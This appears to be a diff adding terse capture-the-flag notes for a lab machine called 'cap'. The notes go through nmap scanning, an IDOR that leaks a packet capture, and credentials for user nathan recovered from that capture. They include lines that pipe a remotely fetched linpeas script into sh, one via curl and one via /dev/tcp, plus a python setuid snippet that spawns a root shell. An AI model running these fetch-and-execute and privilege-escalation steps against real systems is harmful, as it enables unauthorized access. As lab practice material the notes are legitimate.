@@ -1,0 +1,31 @@
+cap box
+10.10.10.245
+nmap -sC -sV -vv shows
+vsftp on 21
+http on 80
+there are various links on the webpage
+        going to 10.10.10.245/data/2 (IDOR)
+        down load pcap
+        go to 10.10.10.245/0
+        download pcpap
+use tshark -r <pacp file> to analysse
+        the pacap shows vsftp login
+                nathan
+get user.txt
+creds work for ssh also
+user flag
+# From public github
+https://github.com/peass-ng/PEASS-ng/releases/tag/20251007-02ee8e3f
+
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+run a nc listener on our client
+# Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host (ie our client)
+cat < /dev/tcp/IP/80 | sh #Victim (where IP is our client TUN)
+
+run as python3.8
+import os
+os.setuid(0)
+os.system("/bin/bash")
+this will give root privilege as /usr/bin/python3.8 has
+cap_setuid and /usr/bin/python3.8 is cap_net_bind_service
